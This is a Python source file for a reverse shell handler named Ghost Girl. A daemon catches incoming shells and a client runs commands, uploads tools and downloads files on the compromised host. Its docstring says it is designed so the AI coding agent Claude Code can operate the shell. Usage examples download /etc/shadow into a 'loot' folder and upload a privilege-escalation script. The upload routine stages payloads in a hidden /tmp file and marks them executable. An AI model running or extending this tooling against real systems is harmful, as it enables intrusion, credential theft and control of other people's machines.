#!/usr/bin/env python3
"""Ghost Girl — Reverse shell handler (daemon/client architecture).

Daemon mode: catches incoming reverse shells, serves commands via Unix socket.
Client mode: sends commands to daemon, prints output, exits.

This solves Claude Code's non-interactive terminal constraint — the daemon
persists the TCP connection while each client invocation is stateless.

Usage:
  # Start daemon (catches shells on port 4444)
  python3 ghost-listen.py --lport 4444 &

  # Send commands via client
  python3 ghost-listen.py --cmd "whoami"
  python3 ghost-listen.py --cmd "cat /etc/passwd"

  # File transfer
  python3 ghost-listen.py --download /etc/shadow --output loot/shadow
  python3 ghost-listen.py --upload linpeas.sh --dest /tmp/linpeas.sh

  # Check status
  python3 ghost-listen.py --status

  # Shutdown daemon
  python3 ghost-listen.py --shutdown
"""

import argparse
import base64
import json
import os
import random
import select
import signal
import socket
import string
import struct
import sys
import threading
import time

# Add project root to path for lib imports
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
sys.path.insert(0, PROJECT_ROOT)

from tools.lib.config import LISTEN_SOCKET, DEFAULT_LPORT
from tools.lib.output import banner, status, success, error, warning, data


# ── Protocol ─────────────────────────────────────────────────────
# Client <-> Daemon communicate via JSON over Unix domain socket.
# Request:  {"action": "cmd"|"upload"|"download"|"status"|"shutdown", ...}
# Response: {"ok": bool, "output": str, ...}

def _random_marker(length=32):
    """Generate a random marker for output delimiting."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def _send_msg(sock, data_dict):
    """Send a length-prefixed JSON message."""
    raw = json.dumps(data_dict).encode()
    sock.sendall(struct.pack("!I", len(raw)) + raw)


def _recv_msg(sock, timeout=300):
    """Receive a length-prefixed JSON message."""
    sock.settimeout(timeout)
    header = b""
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            raise ConnectionError("Connection closed")
        header += chunk
    msg_len = struct.unpack("!I", header)[0]
    parts = []
    received = 0
    while received < msg_len:
        chunk = sock.recv(min(65536, msg_len - received))
        if not chunk:
            raise ConnectionError("Connection closed")
        parts.append(chunk)
        received += len(chunk)
    return json.loads(b"".join(parts).decode())


# ── Daemon ───────────────────────────────────────────────────────

class GhostDaemon:
    """Listens for reverse shells and serves commands via Unix socket."""

    def __init__(self, lport, lhost="0.0.0.0"):
        self.lport = lport
        self.lhost = lhost
        self.target_sock = None
        self.target_addr = None
        self.lock = threading.Lock()
        self.running = True

    def start(self):
        banner("Ghost Listen — Daemon")
        data("LPORT", str(self.lport))

        # Clean up stale socket
        if os.path.exists(LISTEN_SOCKET):
            try:
                # Test if another daemon is running
                test = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                test.settimeout(2)
                test.connect(LISTEN_SOCKET)
                test.close()
                error(f"Another daemon is already running on {LISTEN_SOCKET}")
                sys.exit(1)
            except (ConnectionRefusedError, OSError):
                os.unlink(LISTEN_SOCKET)

        # Start TCP listener for reverse shells
        tcp_thread = threading.Thread(target=self._tcp_listener, daemon=True)
        tcp_thread.start()

        # Start Unix socket server for client commands
        self._unix_server()

    def _tcp_listener(self):
        """Listen for incoming reverse shells."""
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(2)
        srv.bind((self.lhost, self.lport))
        srv.listen(1)
        status(f"Listening for shells on {self.lhost}:{self.lport}...")

        while self.running:
            try:
                conn, addr = srv.accept()
                with self.lock:
                    if self.target_sock:
                        try:
                            self.target_sock.close()
                        except OSError:
                            pass
                    self.target_sock = conn
                    self.target_addr = addr
                success(f"Shell caught from {addr[0]}:{addr[1]}")
                data("SHELL_FROM", f"{addr[0]}:{addr[1]}")
            except socket.timeout:
                continue
            except OSError:
                if self.running:
                    continue
                break
        srv.close()

    def _unix_server(self):
        """Handle client commands via Unix domain socket."""
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(LISTEN_SOCKET)
        srv.listen(5)
        srv.settimeout(2)
        status(f"Command socket ready: {LISTEN_SOCKET}")

        # Handle SIGTERM gracefully
        def shutdown_handler(signum, frame):
            self.running = False
        signal.signal(signal.SIGTERM, shutdown_handler)
        signal.signal(signal.SIGINT, shutdown_handler)

        while self.running:
            try:
                client, _ = srv.accept()
                threading.Thread(
                    target=self._handle_client, args=(client,), daemon=True
                ).start()
            except socket.timeout:
                continue
            except OSError:
                break

        # Cleanup
        srv.close()
        if os.path.exists(LISTEN_SOCKET):
            os.unlink(LISTEN_SOCKET)
        if self.target_sock:
            try:
                self.target_sock.close()
            except OSError:
                pass
        status("Daemon shut down.")

    def _handle_client(self, client):
        """Process a single client request."""
        try:
            req = _recv_msg(client, timeout=30)
            action = req.get("action", "")

            if action == "status":
                self._handle_status(client)
            elif action == "cmd":
                self._handle_cmd(client, req)
            elif action == "upload":
                self._handle_upload(client, req)
            elif action == "download":
                self._handle_download(client, req)
            elif action == "shutdown":
                _send_msg(client, {"ok": True, "output": "Shutting down..."})
                self.running = False
            else:
                _send_msg(client, {"ok": False, "output": f"Unknown action: {action}"})
        except Exception as e:
            try:
                _send_msg(client, {"ok": False, "output": str(e)})
            except Exception:
                pass
        finally:
            client.close()

    def _handle_status(self, client):
        """Return daemon status."""
        with self.lock:
            has_shell = self.target_sock is not None
            addr = f"{self.target_addr[0]}:{self.target_addr[1]}" if self.target_addr else "none"

        # Verify shell is still alive if we think we have one
        if has_shell:
            try:
                self.target_sock.setblocking(False)
                try:
                    peek = self.target_sock.recv(1, socket.MSG_PEEK)
                    if not peek:
                        has_shell = False
                except BlockingIOError:
                    pass  # No data available = still alive
                except OSError:
                    has_shell = False
                finally:
                    self.target_sock.setblocking(True)
            except Exception:
                has_shell = False

            if not has_shell:
                with self.lock:
                    self.target_sock = None
                    self.target_addr = None

        _send_msg(client, {
            "ok": True,
            "connected": has_shell,
            "target": addr,
            "lport": self.lport,
            "output": f"Connected to {addr}" if has_shell else "No active shell"
        })

    def _send_to_target(self, command, timeout=30):
        """Send a command to the target shell and capture output."""
        with self.lock:
            if not self.target_sock:
                return False, "No active shell connection"
            sock = self.target_sock

        marker = _random_marker()
        # We echo a unique marker after the command to know when output is done
        wrapped = f"{command}\necho {marker}\n"

        try:
            sock.sendall(wrapped.encode())
        except (BrokenPipeError, OSError) as e:
            with self.lock:
                self.target_sock = None
                self.target_addr = None
            return False, f"Shell connection lost: {e}"

        # Collect output until we see the marker
        output_parts = []
        sock.settimeout(timeout)
        deadline = time.time() + timeout

        while time.time() < deadline:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    with self.lock:
                        self.target_sock = None
                        self.target_addr = None
                    return False, "Shell connection closed"
                decoded = chunk.decode("utf-8", errors="replace")
                output_parts.append(decoded)
                full = "".join(output_parts)
                if marker in full:
                    # Extract everything before the marker
                    idx = full.index(marker)
                    result = full[:idx]
                    # Strip the echoed command from the beginning if present
                    lines = result.split('\n')
                    # Remove lines that are just the command echo or empty
                    clean_lines = []
                    cmd_stripped = False
                    for line in lines:
                        stripped = line.strip()
                        if not cmd_stripped and (stripped == command.strip() or stripped == f"{command.strip()}"):
                            cmd_stripped = True
                            continue
                        clean_lines.append(line)
                    result = '\n'.join(clean_lines).strip()
                    return True, result
            except socket.timeout:
                continue
            except OSError as e:
                with self.lock:
                    self.target_sock = None
                    self.target_addr = None
                return False, f"Shell error: {e}"

        return False, f"Command timed out after {timeout}s"

    def _handle_cmd(self, client, req):
        """Execute a command on the target."""
        command = req.get("command", "")
        timeout = req.get("timeout", 30)
        if not command:
            _send_msg(client, {"ok": False, "output": "No command provided"})
            return

        ok, output = self._send_to_target(command, timeout=timeout)
        _send_msg(client, {"ok": ok, "output": output})

    def _handle_upload(self, client, req):
        """Upload a file to the target via base64."""
        local_path = req.get("local_path", "")
        remote_path = req.get("remote_path", "")
        if not local_path or not remote_path:
            _send_msg(client, {"ok": False, "output": "Need local_path and remote_path"})
            return
        if not os.path.isfile(local_path):
            _send_msg(client, {"ok": False, "output": f"Local file not found: {local_path}"})
            return

        with open(local_path, "rb") as f:
            content = base64.b64encode(f.read()).decode()

        # Upload in chunks to avoid shell line length limits
        chunk_size = 4096
        chunks = [content[i:i+chunk_size] for i in range(0, len(content), chunk_size)]

        # Write first chunk (overwrite)
        ok, out = self._send_to_target(f"echo -n '{chunks[0]}' > /tmp/.ghost_upload_b64", timeout=10)
        if not ok:
            _send_msg(client, {"ok": False, "output": f"Upload failed: {out}"})
            return

        # Append remaining chunks
        for chunk in chunks[1:]:
            ok, out = self._send_to_target(f"echo -n '{chunk}' >> /tmp/.ghost_upload_b64", timeout=10)
            if not ok:
                _send_msg(client, {"ok": False, "output": f"Upload failed mid-transfer: {out}"})
                return

        # Decode and move to destination
        ok, out = self._send_to_target(
            f"base64 -d /tmp/.ghost_upload_b64 > {remote_path} && "
            f"chmod +x {remote_path} && "
            f"rm -f /tmp/.ghost_upload_b64 && "
            f"ls -la {remote_path}",
            timeout=15
        )

        _send_msg(client, {"ok": ok, "output": out if ok else f"Decode failed: {out}"})

    def _handle_download(self, client, req):
        """Download a file from the target via base64."""
        remote_path = req.get("remote_path", "")
        local_path = req.get("local_path", "")
        if not remote_path:
            _send_msg(client, {"ok": False, "output": "Need remote_path"})
            return

        ok, out = self._send_to_target(f"base64 {remote_path}", timeout=30)
        if not ok:
            _send_msg(client, {"ok": ok, "output": out})
            return

        try:
            raw = base64.b64decode(out.strip())
        except Exception as e:
            _send_msg(client, {"ok": False, "output": f"Base64 decode error: {e}"})
            return

        if local_path:
            os.makedirs(os.path.dirname(local_path) or ".", exist_ok=True)
            with open(local_path, "wb") as f:
                f.write(raw)
            _send_msg(client, {"ok": True, "output": f"Downloaded {len(raw)} bytes → {local_path}"})
        else:
            # Return content as string (for text files)
            try:
                text = raw.decode("utf-8")
                _send_msg(client, {"ok": True, "output": text})
            except UnicodeDecodeError:
                _send_msg(client, {"ok": True, "output": f"[Binary data: {len(raw)} bytes]"})


# ── Client ───────────────────────────────────────────────────────

class GhostClient:
    """Stateless client that talks to the daemon."""

    def __init__(self):
        if not os.path.exists(LISTEN_SOCKET):
            error("Daemon not running (socket not found)")
            error(f"Start with: python3 {__file__} --lport <PORT> &")
            sys.exit(1)

    def _request(self, req, timeout=60):
        """Send request to daemon, return response."""
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect(LISTEN_SOCKET)
            _send_msg(sock, req)
            return _recv_msg(sock, timeout=timeout)
        except ConnectionRefusedError:
            error("Daemon not responding (stale socket?)")
            error(f"Remove {LISTEN_SOCKET} and restart daemon")
            sys.exit(1)
        finally:
            sock.close()

    def cmd(self, command, timeout=30):
        """Execute a command on the target."""
        resp = self._request({"action": "cmd", "command": command, "timeout": timeout},
                             timeout=timeout + 10)
        if resp["ok"]:
            print(resp["output"])
        else:
            error(resp["output"])
        return resp["ok"]

    def upload(self, local_path, remote_path):
        """Upload a file to the target."""
        resp = self._request({
            "action": "upload",
            "local_path": os.path.abspath(local_path),
            "remote_path": remote_path
        }, timeout=120)
        if resp["ok"]:
            success(resp["output"])
        else:
            error(resp["output"])
        return resp["ok"]

    def download(self, remote_path, local_path=None):
        """Download a file from the target."""
        req = {"action": "download", "remote_path": remote_path}
        if local_path:
            req["local_path"] = os.path.abspath(local_path)
        resp = self._request(req, timeout=120)
        if resp["ok"]:
            if local_path:
                success(resp["output"])
            else:
                print(resp["output"])
        else:
            error(resp["output"])
        return resp["ok"]

    def get_status(self):
        """Get daemon status."""
        resp = self._request({"action": "status"}, timeout=10)
        if resp.get("connected"):
            success(f"Shell connected: {resp.get('target')}")
            data("SHELL_CONNECTED", "true")
            data("SHELL_TARGET", resp.get("target", "unknown"))
        else:
            warning("No active shell connection")
            data("SHELL_CONNECTED", "false")
        data("LPORT", str(resp.get("lport", "?")))
        return resp

    def shutdown(self):
        """Shutdown the daemon."""
        resp = self._request({"action": "shutdown"}, timeout=10)
        success(resp.get("output", "Done"))


# ── Main ─────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Ghost Listen — Reverse shell handler (daemon/client)"
    )

    # Daemon mode
    parser.add_argument("--lport", type=int, default=None,
                        help=f"Start daemon listening on this port (default: {DEFAULT_LPORT})")
    parser.add_argument("--lhost", default="0.0.0.0",
                        help="Bind address for daemon (default: 0.0.0.0)")

    # Client mode
    parser.add_argument("--cmd", type=str, default=None,
                        help="Send command to target via daemon")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Command timeout in seconds (default: 30)")
    parser.add_argument("--upload", type=str, default=None,
                        help="Local file to upload to target")
    parser.add_argument("--dest", type=str, default=None,
                        help="Remote destination path for upload")
    parser.add_argument("--download", type=str, default=None,
                        help="Remote file to download from target")
    parser.add_argument("--output", type=str, default=None,
                        help="Local output path for download")
    parser.add_argument("--status", action="store_true",
                        help="Check daemon/shell status")
    parser.add_argument("--shutdown", action="store_true",
                        help="Shutdown the daemon")

    args = parser.parse_args()

    # Determine mode
    is_daemon = args.lport is not None
    is_client = any([args.cmd, args.upload, args.download, args.status, args.shutdown])

    if not is_daemon and not is_client:
        parser.print_help()
        sys.exit(1)

    if is_daemon and is_client:
        error("Cannot run daemon and client modes simultaneously")
        sys.exit(1)

    if is_daemon:
        daemon = GhostDaemon(args.lport, args.lhost)
        daemon.start()
    else:
        client = GhostClient()
        if args.status:
            client.get_status()
        elif args.shutdown:
            client.shutdown()
        elif args.cmd:
            ok = client.cmd(args.cmd, timeout=args.timeout)
            sys.exit(0 if ok else 1)
        elif args.upload:
            if not args.dest:
                error("--upload requires --dest <remote_path>")
                sys.exit(1)
            ok = client.upload(args.upload, args.dest)
            sys.exit(0 if ok else 1)
        elif args.download:
            ok = client.download(args.download, args.output)
            sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
